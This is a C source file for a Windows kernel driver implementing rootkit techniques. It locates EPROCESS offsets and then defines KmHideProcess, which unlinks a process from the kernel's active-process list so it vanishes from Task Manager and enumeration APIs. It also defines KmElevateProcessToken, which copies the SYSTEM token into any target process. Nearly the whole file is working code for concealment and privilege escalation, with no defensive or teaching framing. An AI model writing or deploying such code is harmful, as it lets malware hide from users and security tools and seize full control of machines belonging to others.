#include "eprocess.h"

/* Exported by ntoskrnl — the EPROCESS of the System process (PID 4) */
extern PEPROCESS PsInitialSystemProcess;

/* Cached offsets resolved once at driver load */
static ULONG g_ActiveProcessLinksOffset = 0;
static ULONG g_TokenOffset = 0;

/*
 * FindUniqueProcessIdOffset
 *
 * Scans the System EPROCESS for the known PID value (4) to locate
 * the UniqueProcessId field. Works across Windows versions.
 */
static ULONG FindUniqueProcessIdOffset( VOID )
{
	HANDLE SystemPid = PsGetProcessId( PsInitialSystemProcess );
	ULONG  Offset;

	for ( Offset = 0; Offset < 0x600; Offset += sizeof( ULONG_PTR ) )
	{
		if ( *(PHANDLE)( (PUCHAR)PsInitialSystemProcess + Offset ) == SystemPid )
			return Offset;
	}

	return 0;
}

/*
 * FindTokenOffset
 *
 * Locates the Token (EX_FAST_REF) field in EPROCESS by comparing
 * against the value returned by PsReferencePrimaryToken.
 * On x64, EX_FAST_REF stores the pointer in the upper 60 bits.
 */
static ULONG FindTokenOffset( VOID )
{
	PACCESS_TOKEN Token;
	ULONG64       TokenPtr;
	ULONG         Offset;

	Token = PsReferencePrimaryToken( PsInitialSystemProcess );
	TokenPtr = (ULONG64)(ULONG_PTR)Token;

	for ( Offset = 0; Offset < 0x800; Offset += sizeof( ULONG_PTR ) )
	{
		ULONG64 Value = *(PULONG64)( (PUCHAR)PsInitialSystemProcess + Offset );

		/* EX_FAST_REF: low 4 bits are ref count on x64, low 3 on x86 */
		if ( ( Value & ~(ULONG64)0xF ) == TokenPtr )
		{
			PsDereferencePrimaryToken( Token );
			return Offset;
		}
	}

	PsDereferencePrimaryToken( Token );
	return 0;
}

/*
 * KmInitializeEprocessOffsets
 *
 * Must be called from DriverEntry. Resolves the dynamic EPROCESS offsets
 * for ActiveProcessLinks and Token once, caching them for later use.
 */
NTSTATUS KmInitializeEprocessOffsets( VOID )
{
	ULONG PidOffset;

	PidOffset = FindUniqueProcessIdOffset();
	if ( PidOffset == 0 )
		return STATUS_NOT_FOUND;

	/* ActiveProcessLinks immediately follows UniqueProcessId */
	g_ActiveProcessLinksOffset = PidOffset + (ULONG)sizeof( HANDLE );

	g_TokenOffset = FindTokenOffset();
	if ( g_TokenOffset == 0 )
		return STATUS_NOT_FOUND;

	return STATUS_SUCCESS;
}

/*
 * KmHideProcess
 *
 * Unlinks the target process from the ActiveProcessLinks doubly-linked list.
 * After unlinking, the process no longer appears in Task Manager or
 * process enumeration APIs (NtQuerySystemInformation, etc.).
 *
 * The entry's Flink/Blink are pointed to itself so that process teardown
 * does not corrupt the list on exit.
 */
NTSTATUS KmHideProcess(
	IN HANDLE ProcessId
)
{
	PEPROCESS   Process = NULL;
	NTSTATUS    Status;
	PLIST_ENTRY Entry;

	if ( g_ActiveProcessLinksOffset == 0 )
		return STATUS_DEVICE_NOT_READY;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	Entry = (PLIST_ENTRY)( (PUCHAR)Process + g_ActiveProcessLinksOffset );

	/* Unlink from the doubly-linked list */
	Entry->Blink->Flink = Entry->Flink;
	Entry->Flink->Blink = Entry->Blink;

	/* Point to self — prevents BSOD during process teardown */
	Entry->Flink = Entry;
	Entry->Blink = Entry;

	ObDereferenceObject( Process );

	return STATUS_SUCCESS;
}

/*
 * KmElevateProcessToken
 *
 * Copies the SYSTEM process token (from PsInitialSystemProcess) into the
 * target process's Token field. After this, the target runs with
 * NT AUTHORITY\SYSTEM privileges.
 *
 * The Token field is an EX_FAST_REF — a pointer with reference count
 * bits packed into the low nibble. We copy the raw value directly.
 */
NTSTATUS KmElevateProcessToken(
	IN HANDLE ProcessId
)
{
	PEPROCESS Process = NULL;
	NTSTATUS  Status;

	if ( g_TokenOffset == 0 )
		return STATUS_DEVICE_NOT_READY;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	/* Copy the raw EX_FAST_REF token value from System to target */
	*(PULONG64)( (PUCHAR)Process + g_TokenOffset ) =
		*(PULONG64)( (PUCHAR)PsInitialSystemProcess + g_TokenOffset );

	ObDereferenceObject( Process );

	return STATUS_SUCCESS;
}
